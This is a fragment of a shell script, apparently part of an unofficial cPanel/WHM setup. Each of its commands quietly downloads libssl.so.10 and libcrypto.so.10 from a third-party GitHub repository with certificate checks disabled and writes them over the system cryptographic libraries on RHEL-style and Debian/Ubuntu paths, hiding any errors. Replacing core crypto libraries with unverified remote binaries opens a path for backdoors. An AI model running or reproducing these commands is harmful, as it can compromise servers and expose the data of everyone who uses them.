...
wget -q --no-check-certificate -O /usr/lib64/libssl.so.10 \
    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libssl.so.10
wget -q --no-check-certificate -O /usr/lib64/libcrypto.so.10 \
    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libcrypto.so.10

# For Debian/Ubuntu systems too
wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libssl.so.10 \
    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libssl.so.10 2>/dev/null || true
wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libcrypto.so.10 \
    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libcrypto.so.10 2>/dev/null || true
